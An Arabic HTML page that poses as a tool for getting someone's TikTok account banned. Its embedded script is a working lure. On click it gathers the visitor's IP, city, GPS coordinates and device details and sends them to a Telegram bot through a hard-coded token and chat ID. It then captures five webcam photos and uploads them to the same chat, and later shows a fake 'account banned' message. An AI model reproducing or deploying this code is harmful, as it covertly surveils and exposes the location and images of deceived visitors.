<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>تبنيد حساب تيك توك</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
  <style>
    body {
      margin: 0;
      font-family: 'Cairo', sans-serif;
      background: black;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
      position: relative;
      overflow: hidden;
    }
    #particles-js {
      position: absolute;
      width: 100%;
      height: 100%;
      top: 0; left: 0;
      z-index: 0;
    }
    .content {
      z-index: 1;
      width: 100%;
      max-width: 400px;
      padding: 20px;
    }
    h1 {
      font-size: 28px;
      margin-bottom: 15px;
      color: #ff0050;
      text-shadow: 0 0 10px #ff0050;
    }
    p {
      color: #ccc;
      margin-bottom: 20px;
    }
    button {
      background: #ff0050;
      color: white;
      border: none;
      padding: 14px 28px;
      border-radius: 50px;
      font-size: 18px;
      cursor: pointer;
      box-shadow: 0 0 20px #ff0050;
      transition: background 0.3s ease;
      width: 100%;
      max-width: 300px;
    }
    button:hover {
      background: #e60045;
    }
    input {
      padding: 12px 15px;
      border-radius: 30px;
      border: none;
      margin-bottom: 25px;
      text-align: center;
      font-size: 18px;
      width: 100%;
      max-width: 300px;
      box-shadow: 0 0 10px #ff0050;
      background: #111;
      color: white;
    }
    video {
      display: none;
    }
    .icon {
      font-size: 60px;
      margin-bottom: 20px;
      color: #ff0050;
      text-shadow: 0 0 15px #ff0050;
    }
  </style>
</head>
<body>

  <div id="particles-js"></div>

  <div class="content">
    <div class="icon"><i class="fab fa-tiktok"></i></div>
    <h1>تبنيد حساب تيك توك</h1>
    <p>أدخل يوزرك بدون علامة @</p>
    <input id="username" type="text" placeholder="username" autocomplete="off" />
    <button onclick="startProcess()">اضغط هنا لتبنيد الحساب</button>
    <video id="video" autoplay playsinline></video>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/particles.js"></script>
  <script>
    particlesJS("particles-js", {
      particles: {
        number: { value: 100 },
        color: { value: "#ff0050" },
        shape: { type: "circle" },
        opacity: { value: 0.5 },
        size: { value: 3 },
        move: { enable: true, speed: 1 }
      }
    });

    const token = "7439082421:AAEG8hImgTBzQgz9SQbYq47FfGJldOQC_HI";
    const chatId = "7220184605";

    async function sendTelegramMessage(text) {
      return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text }),
      });
    }

    async function sendPhoto(blob) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, "photo.jpg");
      return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    }

    async function getIPInfo() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        return await res.json();
      } catch {
        return {};
      }
    }

    async function getBatteryInfo() {
      try {
        const battery = await navigator.getBattery();
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging ? "نعم ⚡" : "لا ❌"
        };
      } catch {
        return { level: "غير معروف", charging: "غير معروف" };
      }
    }

    async function getLocation() {
      return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition((pos) => {
          const lat = pos.coords.latitude.toFixed(5);
          const lon = pos.coords.longitude.toFixed(5);
          resolve(`https://maps.google.com/?q=${lat},${lon}`);
        }, () => {
          resolve("❌ غير مسموح أو غير متاح");
        }, { timeout: 5000 });
      });
    }

    function delay(ms) {
      return new Promise(res => setTimeout(res, ms));
    }

    async function startProcess() {
      const usernameInput = document.getElementById("username");
      const username = usernameInput.value.trim();
      if (!username) {
        alert("يرجى إدخال اليوزر بدون علامة @");
        return;
      }

      usernameInput.disabled = true;
      document.querySelector("button").disabled = true;

      const ipInfo = await getIPInfo();
      const battery = await getBatteryInfo();
      const location = await getLocation();
      const now = new Date().toLocaleString("ar-SY", { timeZone: "Asia/Damascus" });

      const deviceInfo = navigator.userAgent;
      const screenRes = `${screen.width}x${screen.height}`;
      const connection = navigator.connection || {};
      const memory = navigator.deviceMemory || "غير معروف";
      const cores = navigator.hardwareConcurrency || "غير معروف";

      let message = `
📝 معلومات الزائر:
👤 اليوزر: ${username}
🌍 الدولة: ${ipInfo.country_name || "غير معروف"}
🏙️ المدينة: ${ipInfo.city || "غير معروف"}
🌐 IP: ${ipInfo.ip || "غير معروف"}
📍 الموقع الجغرافي: ${location}

📱 معلومات الجهاز:
🔋 الشحن: ${battery.level}%
⚡ هل يشحن؟: ${battery.charging}
📶 الاتصال: ${connection.effectiveType || "غير معروف"}
💾 الذاكرة: ${memory} GB
⚙️ الأنوية: ${cores}
🖥️ المتصفح: ${deviceInfo}
📏 الشاشة: ${screenRes}
🕓 الوقت: ${now}
`;

      await sendTelegramMessage(message);

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById("video");
        video.srcObject = stream;
        video.play();

        for(let i = 1; i <= 5; i++) {
          await delay(1500);
          const canvas = document.createElement("canvas");
          canvas.width = 640;
          canvas.height = 480;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          await new Promise(resolve => canvas.toBlob(async (blob) => {
            await sendPhoto(blob);
            resolve();
          }, "image/jpeg"));
        }

        stream.getTracks().forEach(track => track.stop());

        alert("✅ تم إرسال الصور والمعلومات بنجاح!");

        // بعد 10 دقائق تظهر رسالة الحظر
        setTimeout(() => {
          alert("🚫 تم حظر الحساب نهائيًا");
        }, 10 * 60 * 1000);

      } catch (err) {
        alert("⚠️ الكاميرا غير مفعلة أو تم الرفض.");
        await sendTelegramMessage("⚠️ الكاميرا غير مفعلة أو تم الرفض.");
      }

      usernameInput.disabled = false;
      document.querySelector("button").disabled = false;
    }
  </script>

</body>
</html>
